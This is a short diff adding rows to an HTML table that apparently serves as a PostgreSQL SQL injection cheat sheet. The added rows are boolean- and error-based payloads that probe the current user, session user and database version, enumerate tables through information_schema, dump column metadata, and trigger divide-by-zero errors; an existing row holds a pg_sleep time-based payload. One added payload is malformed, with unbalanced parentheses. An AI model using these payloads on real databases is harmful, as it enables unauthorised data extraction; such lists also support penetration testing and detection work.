@@ -22,5 +22,26 @@
     <tr>
       <td>'||pg_sleep(10)--</td>
     </tr>
+    <tr>
+      <td>AND current_user like '%'</td>
+    </tr>
+      <tr>
+      <td>AND session_user like '%'</td>
+    </tr>
+    <tr>
+      <td>AND version() like '%'</td>
+    </tr>
+    <tr>
+      <td>AND (SELECT table_name::text FROM information_schema.tables LIMIT 1) LIKE '%'</td>
+    </tr>
+    <tr>
+      <td>AND (SELECT table_name::text FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema') AND table_schema NOT LIKE 'pg_toast%' AND table_type = 'BASE TABLE' LIMIT 1) LIKE '%'</td>
+    </tr>
+    <tr>
+      <td>AND (SELECT row_to_json(t)::text FROM (SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME' LIMIT 1) t),1,1) LIKE '%'</td>
+    </tr>
+    <tr>
+      <td>AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)</td>
+    </tr>
   </tbody>
 </table>
